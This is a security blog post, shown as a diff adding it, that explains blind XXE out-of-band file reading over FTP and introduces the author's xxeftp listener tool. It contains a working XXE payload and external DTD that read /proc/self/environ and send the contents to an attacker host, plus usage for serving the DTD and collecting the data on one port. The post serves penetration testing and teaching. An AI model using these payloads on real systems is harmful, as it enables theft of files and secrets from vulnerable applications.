@@ -1,0 +1,72 @@
+---
+layout: post
+title:  "XXE FTP Server - A {web,ftp}-server for XXE"
+date:   2016-12-11 17:14:39
+categories: security xxe
+---
+
+## XXE - FTP OoB basics
+
+XXE offers a great attack avenue for reading files from a vulnerable web-app. One of my favourite XXE attacks involves protocol handler abuse, where you use FTP to do an out of band read. This is useful in those cases where you have XXE but it is blind. Unlike the normal OoB retreival through HTTP, FTP works with newer versions of Java (>1.7) and there are fewer characters which break the retrieval. HTTP usually breaks as you either hit an invalid character, such as #, or the URL length is exceeded.
+
+Using FTP to retrieve files through XXE is not new and has been covered in depth in a number of places. The attack looks similar to your HTTP OoB retrieval, except you swith the protocol handler to FTP.
+
+XXE Payload:
+
+```
+<?xml version="1.0" ?>
+<!DOCTYPE a [
+<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
+%asd;
+%c;
+]>
+<a>&rrr;</a>
+```
+
+And the External DTD:
+
+```
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+```
+
+Some more examples of this can be found in my [XXE gist](https://gist.github.com/staaldraad/01415b990939494879b4).
+
+## XXE FTP Server
+
+One of the irritations I first ran into when doing this form of XXE was setting up the FTP server. Sure you can have a netcat listener that receives the connection and then you clean up the data, but how about a nice all in one solution? For this I wrote [xxeftp](https://github.com/staaldraad/xxeserv), which sets up a custom FTP server which will receive our payload, extract the data being sent, and return the original version of the file. Quick, clean and easy.
+
+Another irritation encountered in the past has been servers that can only connect out on one port (80 or 443), meaning we need to setup multiple hosts for our XXE attack. One to serve our external DTD and one to receive the FTP payload. To simplify this, I decided to build a "magic" protocol decode into xxeftp. What this means is that it's possible to serve HTTP, HTTPS and FTP on a single port. Now you need one host, with one port and your attack can proceed as normal.
+
+To make this work, you simply need to use xxeftp with the "uno port" option, ```-uno <port>``` , which will setup our multi-listener on the specified port. When a connection is received, the first few bytes will be examined. If the first byte is 0x22, we have  a TLS connection, if 0x71, it's HTTP, otherwise treat it as FTP.
+
+### Usage
+
+Usage is super basic,
+
+```
+Usage of ./xxeftp:
+  -o string
+    	File location to log to
+  -p int
+    	Port to listen on (default 2121)
+  -uno int
+    	Global port to listen on (default 5000)
+  -w	Setup web-server for DTDs
+  -wd string
+    	Folder to server DTD(s) from (default "./")
+  -wp int
+    	Port to serve DTD on (default 2122)
+  -wps int
+    	SSL Port to serve DTD on (default 2123)
+```
+
+The server will automatically generate TLS certificates for the connection if none exist in the web-server directory. Alternatively create cert.pem and key.pem in the web-server directory.
+
+```
+sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
+```
+
+This will setup the server to listen globally on port 443, create a webserver on port 2122, HTTPS web-server on port 2123 and an FTP server on port 2121. If connections come into port 443, it will internally forward the traffic to the correct port/service. Alternatively you can directly send traffic to the desired port.
+
+Have phun,
